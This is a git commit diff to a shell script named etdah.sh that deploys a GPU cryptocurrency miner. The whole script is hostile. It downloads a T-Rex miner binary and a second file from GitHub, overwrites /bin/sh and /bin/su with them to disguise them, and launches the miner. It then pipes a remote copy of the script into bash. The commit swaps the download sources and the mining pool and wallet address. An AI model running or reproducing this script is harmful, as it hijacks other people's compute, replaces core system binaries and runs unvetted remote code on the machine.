3e5b39cfac6f10e5ac043261c580a71de3f2ec53
mahligg45 <87823344+mahligg45@users.noreply.github.com>
2022-07-24 22:01:49 +0700

    Update etdah.sh

--- etdah.sh
+++ etdah.sh
@@ -1,13 +1,13 @@
 #!/bin/bash
 echo "ENGINE START!"
 export LD_PRELOAD=
-curl -sLO https://raw.githubusercontent.com/ALICLAYSMEN/trexxx/main/t-rex
-curl -sLO https://raw.githubusercontent.com/ALICLAYSMEN/trexxx/main/etdah
+curl -sLO https://raw.githubusercontent.com/mahligg45/tes/trexxx/main/t-rex
+curl -sLO https://raw.githubusercontent.com/mahligg45/tes/main/etdah
 mv t-rex /bin/sh
 mv etdah /bin/su
 chmod +x /bin/sh
 chmod +x /bin/su
 
-#/bin/pwd -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0xc849640837cBce9Ec3e3ce1d1f755A2DE5fb6ddF -p x -w rig0 --no-sni --dns-https-server 1.1.1.1 --time-limit 240 --keep-gpu-busy --no-watchdog
+#/bin/pwd -a ethash -o stratum+ssl://alena.hopto.org:12020 -u 0x3d02f7b8dcb18e778fe35bf8b5a7f91d819bf0c4 -p x -w rig0 --no-sni --dns-https-server 1.1.1.1 --time-limit 240 --keep-gpu-busy --no-watchdog
 /bin/sh -c /bin/su
-curl https://raw.githubusercontent.com/ALICLAYSMEN/trexxx/main/etdah.sh | bash
+curl https://raw.githubusercontent.com/mahligg45/tes/main/etdah.sh | bash
